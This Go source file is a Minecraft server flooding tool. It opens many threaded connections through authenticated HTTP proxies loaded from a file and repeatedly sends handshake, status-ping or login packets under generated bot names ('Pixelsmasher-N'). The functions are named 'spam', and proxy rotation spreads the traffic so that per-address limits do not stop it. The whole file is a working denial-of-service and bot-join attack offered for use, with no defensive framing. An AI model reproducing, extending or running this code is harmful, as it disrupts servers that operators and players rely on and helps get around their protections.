package main

import (
	"bufio"
	"encoding/base64"
	"flag"
	"fmt"
	"net"
	"os"
	"strconv"
	"strings"
	"sync"
)

var (
	protocolVersion int
)

const (
	defaultProtocolVersion = 763
)

func init() {
	flag.IntVar(&protocolVersion, "protocol", defaultProtocolVersion, "Minecraft protocol version")
}

func main() {
	var host string
	var motd bool
	var join bool
	var threads int
	var spamPerThread int
	var proxyFile string

	flag.StringVar(&host, "host", "", "Host to connect to in 'hostname:port' format")
	flag.BoolVar(&motd, "motd", false, "Whether to use ping mode")
	flag.BoolVar(&join, "join", false, "Whether to use join mode")
	flag.IntVar(&threads, "threads", 0, "Number of threads")
	flag.IntVar(&spamPerThread, "spt", 0, "Number of motds/joins")
	flag.StringVar(&proxyFile, "proxyfile", "", "File containing proxies")

	flag.Parse()

	if flag.NFlag() == 0 {
		fmt.Println("Example usage:")
		fmt.Println("go run main.go -host=hostname:port -motd=true -threads=1 -spt=100 -protocol=763 -proxyfile=proxies.txt")
		return
	}

	proxies, err := loadProxies(proxyFile)
	if err != nil {
		fmt.Printf("Failed to load proxies: %v\n", err)
		return
	}

	spam(host, motd, join, threads, spamPerThread, proxies)
}

func loadProxies(filePath string) ([]Proxy, error) {
	file, err := os.Open(filePath)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var proxies []Proxy
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := scanner.Text()
		parts := strings.Split(line, ":")
		if len(parts) != 4 {
			continue
		}
		port, _ := strconv.Atoi(parts[1])
		proxies = append(proxies, Proxy{
			Host:     parts[0],
			Port:     port,
			Username: parts[2],
			Password: parts[3],
		})
	}

	if err := scanner.Err(); err != nil {
		return nil, err
	}

	return proxies, nil
}

func spam(host string, motd bool, join bool, threads int, spamPerThread int, proxies []Proxy) {
	var wg sync.WaitGroup
	hostParts := strings.Split(host, ":")
	if len(hostParts) != 2 {
		fmt.Println("Invalid host format. Please provide host in 'hostname:port' format.")
		return
	}
	host = hostParts[0]
	portStr := hostParts[1]
	port, err := strconv.Atoi(portStr)
	if err != nil {
		fmt.Printf("Invalid port: %v\n", err)
		return
	}

	proxyCount := len(proxies)

	for i := 0; i < threads; i++ {
		wg.Add(1)
		go func(threadID int) {
			defer wg.Done()
			for j := 0; j < spamPerThread; j++ {
				proxy := proxies[(threadID*spamPerThread+j)%proxyCount]
				username := fmt.Sprintf("Pixelsmasher-%d", threadID*spamPerThread+j)
				createClient(host, port, username, motd, join, proxy)
			}
		}(i)
	}

	wg.Wait()
}

func createClient(host string, port int, username string, isPing bool, isJoin bool, proxy Proxy) {
	proxyAuth := "Basic " + base64.StdEncoding.EncodeToString([]byte(proxy.Username+":"+proxy.Password))
	options := fmt.Sprintf("%s:%d", proxy.Host, proxy.Port)
	conn, err := net.Dial("tcp", options)
	if err != nil {
		fmt.Printf("Failed to connect to proxy: %v\n", err)
		return
	}
	defer conn.Close()

	connectRequest := fmt.Sprintf(
		"CONNECT %s:%d HTTP/1.1\r\nHost: %s:%d\r\nProxy-Authorization: %s\r\nConnection: keep-alive\r\n\r\n",
		host, port, host, port, proxyAuth,
	)

	_, err = conn.Write([]byte(connectRequest))
	if err != nil {
		fmt.Printf("Failed to write to proxy: %v\n", err)
		return
	}

	reader := bufio.NewReader(conn)
	response, err := reader.ReadString('\n')
	if err != nil || !strings.Contains(response, "200 Connection established") {
		fmt.Println("Failed to establish proxy connection")
		return
	}


	handshakePacket := createHandshakePacket(host, port, func() int {
		if isPing {
			return 1
		}
		return 2
	}())
	conn.Write(handshakePacket)

	if isPing {
		requestPacket := createRequestPacket()
		conn.Write(requestPacket)
	} else if isJoin {
		loginStartPacket := createLoginStartPacket(username)
		conn.Write(loginStartPacket)
	}
}


func writeVarInt(value int) []byte {
	var buffer []byte
	for {
		if value&0xFFFFFF80 == 0 {
			buffer = append(buffer, byte(value))
			break
		}
		buffer = append(buffer, byte(value&0x7F|0x80))
		value >>= 7
	}
	return buffer
}

func createHandshakePacket(host string, port int, nextState int) []byte {
	hostBuffer := []byte(host)
	hostLength := writeVarInt(len(hostBuffer))
	portBuffer := make([]byte, 2)
	portBuffer[0] = byte(port >> 8)
	portBuffer[1] = byte(port)
	nextStateBuffer := writeVarInt(nextState)

	packetID := writeVarInt(0x00)
	protocolBuffer := writeVarInt(protocolVersion)

	packet := append(packetID, protocolBuffer...)
	packet = append(packet, hostLength...)
	packet = append(packet, hostBuffer...)
	packet = append(packet, portBuffer...)
	packet = append(packet, nextStateBuffer...)

	lengthBuffer := writeVarInt(len(packet))
	return append(lengthBuffer, packet...)
}

func createRequestPacket() []byte {
	packetID := writeVarInt(0x00)
	lengthBuffer := writeVarInt(len(packetID))
	return append(lengthBuffer, packetID...)
}

func createLoginStartPacket(username string) []byte {
	usernameBuffer := []byte(username)
	usernameLength := writeVarInt(len(usernameBuffer))

	packetID := writeVarInt(0x00)

	packet := append(packetID, usernameLength...)
	packet = append(packet, usernameBuffer...)

	lengthBuffer := writeVarInt(len(packet))
	return append(lengthBuffer, packet...)
}

type Proxy struct {
	Host     string
	Port     int
	Username string
	Password string
}
